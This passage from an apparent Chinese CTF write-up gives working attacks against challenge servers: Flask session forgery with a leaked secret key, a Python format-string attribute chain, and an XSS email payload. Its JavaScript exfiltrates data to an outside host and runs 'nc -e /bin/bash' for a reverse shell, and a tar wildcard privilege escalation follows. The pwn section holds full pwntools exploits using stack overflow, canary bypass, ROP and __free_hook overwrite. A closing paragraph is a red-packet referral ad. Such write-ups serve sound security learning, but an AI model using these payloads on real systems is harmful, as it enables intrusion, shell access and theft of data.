&lt;/pre&gt;</code>，不能直接读，不过用可以通过<code>/proc/self/cwd</code>绕过。</p><blockquote><p>一个符号连接, 指向进程当前的工作目录. 例如, 要找出进程 20 的 cwd, 可以:<code>cd /proc/20/cwd; /bin/pwd</code></p></blockquote><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/views.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>有了<code>secret_key</code>，首先想到是伪造admin的session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py decode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -c <span class="string">".eJwVzEEKgDAMBdG7_LVIKtpKLyNpmoCoFaquxLurs3qruZF45SKK6OirpQayX-VE_HVUm8590YKIToN3nklzkkTkLAw0ZjHz1MsYNJEO1mWPBtehtfD2TbHMlfG8O_kfGQ.XBscbw.pI4VrBhi7bb3o_V2_spFrWgysI0"</span></span><br><span class="line">&#123;<span class="string">'balance'</span>: 10000.0, <span class="string">'count'</span>: 0, <span class="string">'csrf_token'</span>: <span class="string">'2e7616a0edbcb001f7508dcff604c87eb0e5f2d6'</span>, <span class="string">'username'</span>: <span class="string">'kira'</span>&#125;</span><br><span class="line"></span><br><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py encode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -t <span class="string">"&#123;'balance': 1000000.0, 'count': 1000000.0, 'csrf_token': '2e7616a0edbcb001f7508dcff604c87eb0e5f2d6', 'username': 'admin'&#125;"</span></span><br><span class="line">.eJxVzDsKw0AMRdG9vHoIGpP54M0EjUaC4FgGf6qQvdu4yy1Pcb9o_GEXxRjp7kEBshy-_8u22mtfJnWMGLTkmJm0N2lE0Uqi2sUs01Nq0UaabOgZAcemq_N87cF9fjt-J0JqIVo.XBsiEA.6lDWb7AENFiwelgWZW3hxz4SoFw</span><br></pre></td></tr></table></figure><p>成功得到admin的session后，可以进入<code>getflag()</code>，留意这里有一个格式化字符串的漏洞，如何构造python继承链去读取<code>g.flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">    field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">    mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">    <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>根据提示，user有save方法，一步一步往下找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save&quot;:&quot;&lt;function User.save at 0x7f1b740ee048&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__&quot;:&quot;&#123;..., &apos;db&apos;: &lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;, ...&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db]&quot;:&quot;&lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__&quot;:&quot;&#123;..., &apos;current_app&apos;: &lt;Flask &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>留意到有修饰器<code>@app.before_request</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__&quot;:&quot;&#123;..., &apos;g&apos;: &lt;flask.g of &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag&quot;:&quot;swpuctf&#123;tHl$_15_4_f14G&#125;&quot;, &quot;hash&quot;: &quot;8bce7edc292f3211b97bc0a981c87135f0329681468bb6a3b487aaa23d8473fd&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="有趣的邮箱"><a href="#有趣的邮箱" class="headerlink" title="有趣的邮箱"></a>有趣的邮箱</h3><p>在验证邮箱的页面源码有提示，同时有一个后台管理的页面，不过只允许<code>localhost</code>访问，那么很明显就是通过xss访问管理员的页面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'email'</span>]) &#123;</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error email, please check your email"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"等待管理员自动审核"</span>;</span><br><span class="line"><span class="keyword">echo</span> $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要绕过邮箱的过滤，可以直接用<code>&quot;&lt;script/src=//x.x.x.x/123.js&gt;&lt;/script&gt;&quot;@qq.com</code>绕过</p><p>先打一发admin的cookie：<code>email=&quot;&lt;script/src=//x.x.x.x:50004&gt;&lt;/script&gt;&quot;@qq.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://localhost:6324/admin/admin.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Host: x.x.x.x:50004</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p>然而并没有cookie，不过发现admin的页面链接，尝试读一下<code>admin.php</code>的页面源码，用<code>xssrf-leak</code>的脚本也可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/admin.php'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p><code>email=&quot;&lt;script/src=//x.x.x.x:50005/evil&gt;&lt;/script&gt;&quot;@qq.com</code></p><p>返回结果如下，可以发现一个可以命令执行的链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">118.89.56.208 - - [20/Dec/2018 16:50:22] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">&#123;&apos;f&apos;: u&apos;&lt;br /&gt;&lt;a href=&quot;admin/a0a.php?cmd=whoami&quot;&gt;&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>反弹shell进行操作方便点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+x.x.x.x+20007'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p>在根目录发现flag，但是没有权限读</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:/$ ls -al</span><br><span class="line">-r--------  <span class="number">1</span> flag flag    <span class="number">36</span> Dec <span class="number">18</span> <span class="number">18</span>:<span class="number">14</span> flag</span><br></pre></td></tr></table></figure><p>在web目录发现一个奇怪的文件夹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:~/html/<span class="number">4</span>f0a5ead5aef34138fcbf8cf00029e7b$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">72</span></span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root   <span class="number">4096</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root root   <span class="number">4096</span> Dec <span class="number">20</span> <span class="number">10</span>:<span class="number">07</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root    <span class="number">320</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">14</span> backup.php</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> css</span><br><span class="line">drwxr-x--- <span class="number">5</span> flag nginx <span class="number">36864</span> Dec <span class="number">20</span> <span class="number">19</span>:<span class="number">59</span> files</span><br><span class="line">drw-r--r-- <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> fonts</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root   <span class="number">4714</span> Dec <span class="number">16</span> <span class="number">20</span>:<span class="number">17</span> index.html</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> js</span><br><span class="line">-rw------- <span class="number">1</span> root root      <span class="number">0</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> nohup.out</span><br><span class="line">-r--r----- <span class="number">1</span> flag flag    <span class="number">707</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">13</span> upload.php</span><br></pre></td></tr></table></figure><p>查看<code>backup.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"upload.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"上传目录："</span> . $upload_dir . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$sys = <span class="string">"tar -czf z.tar.gz *"</span>;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'z.tar.gz'</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传目录下的所有文件备份成功!&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"备份文件名: z.tar.gz"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"未上传文件，无法备份！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">利用通配符进行Linux本地提权</a></p><p>根据文章的操作方法，利用上传分别上传3个文件，文件为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint=1</span><br><span class="line">--checkpoint-action=exec=sh exp.sh</span><br><span class="line">exp.sh  #内容放需要执行的命令 cat /flag</span><br></pre></td></tr></table></figure><p>上传完毕后进行一次备份即可执行命令。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit_1"></a>exploit_1</h3><p>看完伪代码，第一反应是利用C++异常处理的机制绕过canary，然而由于格式化字符串限制太少，导致这题出现各种非预期解。</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>首先用格式化字符串泄露heap地址和libc地址，然后输入<code>-9223372036854775808</code>绕过长度限制进行栈溢出，之后利用C++异常处理的机制绕过canary，并且将栈迁移到堆中进行ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%7$p|%12$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">heap_addr = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line">pivot_addr = heap_addr + <span class="number">0x20</span></span><br><span class="line">unwind_addr = <span class="number">0x400EC5</span> </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'aaaaaaaa'</span>,one_gadget).ljust(<span class="number">0x410</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat(pivot_addr,unwind_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h4><p>这个方法最简单，既然有格式化字符串，直接泄露canary好了，还绕过啥，溢出直接组ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%15$p|%12$p'</span>) <span class="comment"># Hello 0x7f4de5bb4620please </span></span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'|'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x408</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) +p64(<span class="number">0x400fa3</span>)+ p64(libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"-9223372036854775808"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'motto:\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h4><p>这个方法只需用到格式字符串，连栈溢出都不需要，万一不知-9223372036854775808这个技巧，这个方法也是很好用的，就是麻烦点。思路就是修改free的got表为main函数，然后就是一个死循环，可以为所欲为，直接改重新改回正确的。可以修改free_hook来getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'motto:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400E93</span></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%147c%11$hhn%123c%12$hhn'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%12$p'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'please'</span>,drop=<span class="keyword">True</span>)[<span class="number">-14</span>:],<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span> </span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">X0 = one_gadget&amp;<span class="number">0x000000ff</span></span><br><span class="line">X1 = (one_gadget&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">X2 = (one_gadget&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">X3 = (one_gadget&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span></span><br><span class="line">X4 = (one_gadget&amp;<span class="number">0xff00000000</span>)&gt;&gt;<span class="number">32</span></span><br><span class="line">X5 = (one_gadget&amp;<span class="number">0xff0000000000</span>)&gt;&gt;<span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X0,(X1-X0)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook) + p64(free_hook+<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X2,(X3-X2)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">2</span>) + p64(free_hook+<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X4,(X5-X4)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">4</span>) + p64(free_hook+<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%214c%11$hhn%51c%12$hhn!'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><p>apk里面有一个zip文件，其实是个jpg，修改后缀打开</p><h3 id="android-2-0"><a href="#android-2-0" class="headerlink" title="android 2.0"></a>android 2.0</h3><p>关键算法在so里面，程序将15位输入分成3块，每块在进行一次简单的运算，直接逆一下就行了。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><ol><li>修改分辨率得到一部分flag</li><li>文件末位有另一部分flag</li></ol><h3 id="唯有低头-才能出头"><a href="#唯有低头-才能出头" class="headerlink" title="唯有低头,才能出头"></a>唯有低头,才能出头</h3><p>举头望明月,低头…  ，（看键盘）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 5 66 3 3 666 33 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">looktheendkeyboard</span><br></pre></td></tr></table></figure><h3 id="流量签到"><a href="#流量签到" class="headerlink" title="流量签到"></a>流量签到</h3><p>直接搜关键字</p><h2 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h2><p>各位大佬帮我薅羊毛啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打开支付宝首页搜“575219”领红包，领到大红包的小伙伴赶紧使用哦！</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyd1myrti1j20fs0noq4z.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
